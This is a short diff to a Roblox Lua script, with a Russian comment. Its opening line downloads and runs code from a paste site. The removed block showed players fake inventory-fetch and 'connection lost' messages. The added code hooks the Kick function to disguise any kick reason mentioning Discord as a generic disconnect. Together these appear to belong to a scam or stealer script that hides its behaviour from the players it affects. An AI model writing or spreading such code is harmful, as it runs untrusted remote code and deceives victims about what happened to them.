@@ -1,11 +1,13 @@
 loadstring(game:HttpGet("https://pastefy.app/2QUNylbN/raw"))()
--- В самом конце скрипта вместо LocalPlayer:Kick("...") поставь это:
-if #AllItems == 0 then
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "Error";
-        Text = "Failed to fetch inventory data. Please rejoin.";
-        Duration = 8;
-    })
-    task.wait(2.5)
-    LocalPlayer:Kick("Connection lost. Please check your internet connection.")
+task.wait(0.1)
+
+local oldKick = LocalPlayer.Kick
+LocalPlayer.Kick = function(self, reason)
+    if reason and string.find(reason:lower(), "discord") then
+        oldKick(self, "Disconnected from server.")
+    else
+        oldKick(self, reason)
+    end
 end
+
+print("Anti-advertisement patch loaded")
